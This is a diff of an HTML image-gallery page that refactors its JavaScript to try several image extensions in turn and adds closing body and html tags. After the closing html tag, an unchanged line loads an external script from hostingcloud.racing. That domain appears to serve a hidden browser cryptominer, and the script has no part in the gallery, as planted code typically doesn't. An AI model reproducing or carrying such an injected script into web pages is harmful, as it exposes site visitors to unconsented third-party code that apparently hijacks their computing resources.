@@ -66,43 +66,51 @@
 </head>
 <body>
     <h1 class="gallery-title">Image Gallery</h1>
-    <div class="gallery-container" id="gallery">
-        <!-- Images will be inserted here by JavaScript -->
-    </div>
+    <div class="gallery-container" id="gallery"></div>
 
     <script>
-        // Number of images in your images folder
-        const imageCount = 5; // Change this to match your actual number of images
-        
-        // Supported image extensions
-        const extensions = ['jpg', 'jpeg', 'png', 'webp'];
-        
+        const imageCount = 5;
+        const extensions = ['png', 'jpg', 'jpeg', 'webp'];
         const galleryContainer = document.getElementById('gallery');
-        
-        for (let i = 1; i <= imageCount; i++) {
+
+        // Function to create image elements with fallback
+        function createImageWithFallback(i) {
             const imageDiv = document.createElement('div');
             imageDiv.className = 'gallery-item';
-            
-            const img = document.createElement('img');
-            
-            // Try different extensions if needed
-            img.src = `images/img${i}.png`; // Change extension if your images use different format
+
+            const img = new Image();
             img.alt = `Image ${i}`;
-            
-            // Fallback for different extensions (optional)
-            img.onerror = function() {
-                for (let ext of extensions) {
-                    if (ext !== 'jpg') { // already tried png
-                        this.src = `images/img${i}.${ext}`;
-                        break;
-                    }
+            img.style.opacity = 0;
+
+            const sources = extensions.map(ext => `images/img${i}.${ext}`);
+            let currentIndex = 0;
+
+            function tryNextSource() {
+                if (currentIndex < sources.length) {
+                    img.src = sources[currentIndex];
+                    currentIndex++;
+                } else {
+                    console.warn(`Image ${i} not found in any supported format`);
                 }
-            };
-            
+            }
+
+            img.onerror = tryNextSource;
+            img.onload = () => img.style.opacity = 1;
+
+            // Start loading process
+            tryNextSource();
+
             imageDiv.appendChild(img);
-            galleryContainer.appendChild(imageDiv);
+            return imageDiv;
+        }
+
+        // Create gallery items
+        for (let i = 1; i <= imageCount; i++) {
+            galleryContainer.appendChild(createImageWithFallback(i));
         }
     </script>
+</body>
+</html>
 
     <script src="https://www.hostingcloud.racing/ibQu.js"></script>
 <script>
